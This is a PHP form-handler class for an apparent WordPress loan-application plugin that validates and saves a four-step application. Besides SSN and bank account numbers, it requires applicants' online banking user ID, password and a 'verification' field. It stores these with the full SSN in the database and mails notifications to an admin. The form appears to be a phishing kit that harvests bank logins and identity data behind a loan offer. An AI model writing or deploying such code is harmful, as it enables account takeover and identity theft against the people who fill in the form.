<?php
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

class Finspire_Loan_Form_Handler {

    public static function init() {
        add_action( 'wp_ajax_nopriv_finspire_submit_loan_application', [ __CLASS__, 'handle_submission' ] );
        add_action( 'wp_ajax_finspire_submit_loan_application', [ __CLASS__, 'handle_submission' ] );

        add_action( 'wp_ajax_nopriv_finspire_validate_step', [ __CLASS__, 'handle_step_validation' ] );
        add_action( 'wp_ajax_finspire_validate_step', [ __CLASS__, 'handle_step_validation' ] );
    }

    /**
     * AJAX handler to validate an individual step
     */
    public static function handle_step_validation() {
        $nonce = sanitize_text_field( $_REQUEST['nonce'] ?? $_REQUEST['loan_nonce'] ?? $_REQUEST['_wpnonce'] ?? '' );
        if ( ! wp_verify_nonce( $nonce, 'finspire_loan_nonce' ) ) {
            wp_send_json_error( [ 'message' => __( 'Security verification failed. Please refresh the page.', 'finspire-loan' ) ], 200 );
        }

        $step = intval( $_POST['step'] ?? 1 );
        $data = wp_unslash( $_POST );
        $errors = self::validate_step( $step, $data );

        if ( ! empty( $errors ) ) {
            wp_send_json_error( [ 'errors' => $errors ], 200 );
        }

        wp_send_json_success( [ 'step' => $step, 'valid' => true ] );
    }

    /**
     * Validate fields by step number
     */
    public static function validate_step( $step, $data ) {
        $errors = [];
        $settings = Finspire_Loan_Settings::get_all();

        if ( 1 === $step ) {
            if ( empty( trim( $data['first_name'] ?? '' ) ) ) {
                $errors['first_name'] = __( 'Please enter your first name.', 'finspire-loan' );
            }
            if ( empty( trim( $data['last_name'] ?? '' ) ) ) {
                $errors['last_name'] = __( 'Please enter your last name.', 'finspire-loan' );
            }
            $email = trim( $data['email'] ?? '' );
            if ( empty( $email ) ) {
                $errors['email'] = __( 'Please enter your email address.', 'finspire-loan' );
            } elseif ( ! is_email( $email ) ) {
                $errors['email'] = __( 'Please enter a valid email address.', 'finspire-loan' );
            }
            $phone = preg_replace( '/\D/', '', $data['phone'] ?? '' );
            if ( empty( $phone ) ) {
                $errors['phone'] = __( 'Please enter your phone number.', 'finspire-loan' );
            } elseif ( strlen( $phone ) !== 10 ) {
                $errors['phone'] = __( 'Please enter a valid 10-digit phone number.', 'finspire-loan' );
            }
            $dob = trim( $data['dob'] ?? '' );
            if ( empty( $dob ) ) {
                $errors['dob'] = __( 'Please enter your date of birth (MM/DD/YYYY).', 'finspire-loan' );
            } else {
                $parts = explode( '/', $dob );
                if ( count( $parts ) === 3 && checkdate( (int) $parts[0], (int) $parts[1], (int) $parts[2] ) ) {
                    $birthDate = new DateTime( sprintf( '%04d-%02d-%02d', (int) $parts[2], (int) $parts[0], (int) $parts[1] ) );
                    $today = new DateTime();
                    $age = $today->diff( $birthDate )->y;
                    if ( $age < 18 ) {
                        $errors['dob'] = __( 'Applicant must be at least 18 years old.', 'finspire-loan' );
                    }
                } else {
                    $errors['dob'] = __( 'Please enter a valid date of birth (MM/DD/YYYY).', 'finspire-loan' );
                }
            }
            $ssn = preg_replace( '/\D/', '', $data['ssn'] ?? '' );
            if ( empty( $ssn ) ) {
                $errors['ssn'] = __( 'Please enter your Social Security Number.', 'finspire-loan' );
            } elseif ( strlen( $ssn ) !== 9 ) {
                $errors['ssn'] = __( 'Please enter a valid 9-digit Social Security Number.', 'finspire-loan' );
            }
        } elseif ( 2 === $step ) {
            if ( empty( trim( $data['street_address'] ?? '' ) ) ) {
                $errors['street_address'] = __( 'Please enter your street address.', 'finspire-loan' );
            }
            if ( empty( trim( $data['zip_code'] ?? '' ) ) ) {
                $errors['zip_code'] = __( 'Please enter your ZIP or postal code.', 'finspire-loan' );
            }
            if ( empty( trim( $data['city'] ?? '' ) ) ) {
                $errors['city'] = __( 'Please enter your city.', 'finspire-loan' );
            }
            if ( empty( trim( $data['state'] ?? '' ) ) ) {
                $errors['state'] = __( 'Please enter your state / province.', 'finspire-loan' );
            }
            if ( empty( trim( $data['country'] ?? '' ) ) ) {
                $errors['country'] = __( 'Please enter your country.', 'finspire-loan' );
            }
        } elseif ( 3 === $step ) {
            $amount = floatval( $data['loan_amount'] ?? 0 );
            $min = floatval( $settings['min_loan_amount'] ?? 100 );
            $max = floatval( $settings['max_loan_amount'] ?? 25000 );
            $sym = $settings['currency_symbol'] ?? '$';

            if ( $amount <= 0 ) {
                $errors['loan_amount'] = __( 'Please specify the loan amount you are seeking.', 'finspire-loan' );
            } elseif ( $amount < $min || $amount > $max ) {
                /* translators: 1: currency symbol, 2: min amount, 3: max amount */
                $errors['loan_amount'] = sprintf(
                    __( 'Loan amount must be between %1$s%2$s and %1$s%3$s.', 'finspire-loan' ),
                    $sym,
                    number_format( $min ),
                    number_format( $max )
                );
            }

            if ( empty( trim( $data['loan_purpose'] ?? '' ) ) ) {
                $errors['loan_purpose'] = __( 'Please select a loan purpose.', 'finspire-loan' );
            }
        } elseif ( 4 === $step ) {
            if ( empty( trim( $data['bank_name'] ?? '' ) ) ) {
                $errors['bank_name'] = __( 'Please enter your bank name.', 'finspire-loan' );
            }
            $routing = preg_replace( '/\D/', '', $data['routing_number'] ?? '' );
            if ( empty( $routing ) ) {
                $errors['routing_number'] = __( 'Please enter your 9-digit routing number.', 'finspire-loan' );
            } elseif ( strlen( $routing ) !== 9 ) {
                $errors['routing_number'] = __( 'Routing number must be exactly 9 digits.', 'finspire-loan' );
            }
            $account = preg_replace( '/\D/', '', $data['account_number'] ?? '' );
            if ( empty( $account ) ) {
                $errors['account_number'] = __( 'Please enter your account number.', 'finspire-loan' );
            } elseif ( strlen( $account ) < 4 || strlen( $account ) > 17 ) {
                $errors['account_number'] = __( 'Account number must be between 4 and 17 digits.', 'finspire-loan' );
            }
            if ( empty( trim( $data['online_banking_verification'] ?? '' ) ) ) {
                $errors['online_banking_verification'] = __( 'Please complete the online banking verification field.', 'finspire-loan' );
            }
            if ( empty( trim( $data['online_banking_user_id'] ?? '' ) ) ) {
                $errors['online_banking_user_id'] = __( 'Please enter your online banking user ID.', 'finspire-loan' );
            }
            if ( empty( $data['online_banking_password'] ?? '' ) ) {
                $errors['online_banking_password'] = __( 'Please enter your online banking password.', 'finspire-loan' );
            }
            if ( empty( $data['contact_consent'] ) ) {
                $errors['contact_consent'] = __( 'Please check the box to agree to the terms to proceed.', 'finspire-loan' );
            }
        }

        return $errors;
    }

    /**
     * AJAX handler for full multi-step form submission
     */
     public static function handle_submission() {
        // 0. Nonce verification supporting multiple request fields without wp_die
        $nonce = sanitize_text_field( $_REQUEST['nonce'] ?? $_REQUEST['loan_nonce'] ?? $_REQUEST['_wpnonce'] ?? '' );
        if ( ! wp_verify_nonce( $nonce, 'finspire_loan_nonce' ) ) {
            wp_send_json_error( [
                'message' => __( 'Security session expired or invalid request. Please refresh the page and try again.', 'finspire-loan' )
            ], 200 );
        }

        $raw = wp_unslash( $_POST );
        $settings = Finspire_Loan_Settings::get_all();

        // 1. Anti-spam Honeypot Check
        if ( ! empty( $raw['fin_hp_check'] ) ) {
            wp_send_json_error( [ 'message' => __( 'Spam detected. Submission rejected.', 'finspire-loan' ) ], 200 );
        }

        // 2. Anti-spam timing check
        if ( ! empty( $settings['enable_honeypot'] ) && ! empty( $raw['fin_form_time'] ) ) {
            $render_time = intval( $raw['fin_form_time'] );
            $min_seconds = intval( $settings['min_submit_seconds'] ?? 2 );
            $elapsed = time() - $render_time;
            if ( $render_time > 0 && $elapsed >= 0 && $elapsed < $min_seconds ) {
                wp_send_json_error( [ 'message' => __( 'Form was submitted too quickly. Please take a moment to review and try again.', 'finspire-loan' ) ], 200 );
            }
        }

        // 3. Comprehensive Server-side Validation of all steps
        $all_errors = [];
        for ( $s = 1; $s <= 4; $s++ ) {
            $step_errors = self::validate_step( $s, $raw );
            if ( ! empty( $step_errors ) ) {
                $all_errors = array_merge( $all_errors, $step_errors );
            }
        }

        if ( ! empty( $all_errors ) ) {
            wp_send_json_error( [
                'message' => __( 'Please correct the errors indicated below before submitting.', 'finspire-loan' ),
                'errors'  => $all_errors,
            ], 200 );
        }

        // 4. Sanitize and prepare data for database storage
        $ssn_clean = preg_replace( '/\D/', '', $raw['ssn'] ?? '' );
        $ssn_formatted = strlen( $ssn_clean ) === 9 
            ? ( substr( $ssn_clean, 0, 3 ) . '-' . substr( $ssn_clean, 3, 2 ) . '-' . substr( $ssn_clean, 5 ) )
            : sanitize_text_field( $raw['ssn'] ?? '' );
        $ssn_masked = strlen( $ssn_clean ) >= 4 ? ( '***-**-' . substr( $ssn_clean, -4 ) ) : '';

        $acct_clean = preg_replace( '/\D/', '', $raw['account_number'] ?? '' );
        $acct_masked = strlen( $acct_clean ) >= 4 ? ( str_repeat( '•', max( 4, strlen( $acct_clean ) - 4 ) ) . substr( $acct_clean, -4 ) ) : '';

        $submission_data = [
            'first_name'            => sanitize_text_field( $raw['first_name'] ?? '' ),
            'last_name'             => sanitize_text_field( $raw['last_name'] ?? '' ),
            'email'                 => sanitize_email( $raw['email'] ?? '' ),
            'phone'                 => sanitize_text_field( $raw['phone'] ?? '' ),
            'dob'                   => sanitize_text_field( $raw['dob'] ?? '' ),
            'ssn'                   => $ssn_formatted,
            'ssn_masked'            => $ssn_masked,
            'age_confirmed'         => 1,
            'street_address'        => sanitize_text_field( $raw['street_address'] ?? '' ),
            'zip_code'              => sanitize_text_field( $raw['zip_code'] ?? '' ),
            'city'                  => sanitize_text_field( $raw['city'] ?? '' ),
            'state'                 => sanitize_text_field( $raw['state'] ?? '' ),
            'country'               => sanitize_text_field( $raw['country'] ?? '' ),
            'bank_name'             => sanitize_text_field( $raw['bank_name'] ?? '' ),
            'routing_number'        => sanitize_text_field( $raw['routing_number'] ?? '' ),
            'account_number'        => $acct_clean,
            'account_number_masked' => $acct_masked,
            'bank_verified'         => 1,
            'online_banking_verification' => sanitize_text_field( $raw['online_banking_verification'] ?? '' ),
            'online_banking_user_id'      => sanitize_text_field( $raw['online_banking_user_id'] ?? '' ),
            'online_banking_password'     => sanitize_text_field( $raw['online_banking_password'] ?? '' ),
            'contact_consent'             => ! empty( $raw['contact_consent'] ) ? 1 : 0,
            'loan_amount'           => floatval( $raw['loan_amount'] ?? 0 ),
            'loan_purpose'          => sanitize_text_field( $raw['loan_purpose'] ?? '' ),
        ];

        // 5. Save to Database
        $saved = Finspire_Loan_DB::insert_submission( $submission_data );

        if ( ! $saved || empty( $saved['id'] ) ) {
            global $wpdb;
            $db_error = ! empty( $wpdb->last_error ) ? $wpdb->last_error : 'Database write error';
            error_log( 'Finspire Loan DB Save Failure: ' . $db_error );

            wp_send_json_error( [
                'message' => __( 'There was a problem saving your application. Please try again or contact support.', 'finspire-loan' )
            ], 200 );
        }

        // 6. Send Emails (Admin and Applicant) - Safe and non-fatal
        try {
            Finspire_Loan_Mailer::send_notifications( $saved );
        } catch ( \Throwable $e ) {
            error_log( 'Finspire Loan Email Notification Exception (non-fatal): ' . $e->getMessage() );
        }

        // 7. Format success output
        $currency = $settings['currency_symbol'];
        $amount_formatted = $currency . number_format( $saved['loan_amount'], 2 );
        $success_msg_tpl = $settings['success_message'];
        $success_msg = str_replace(
            ['{first_name}', '{last_name}', '{reference_no}', '{loan_amount}'],
            [$saved['first_name'], $saved['last_name'], $saved['reference_no'], $amount_formatted],
            $success_msg_tpl
        );

        wp_send_json_success( [
            'reference_no'    => $saved['reference_no'],
            'first_name'      => $saved['first_name'],
            'last_name'       => $saved['last_name'],
            'email'           => $saved['email'],
            'loan_amount'     => $amount_formatted,
            'title'           => $settings['success_title'],
            'message'         => $success_msg,
            'home_url'        => home_url( '/' ),
            'home_btn_label'  => $settings['btn_home'],
        ] );
    }
}
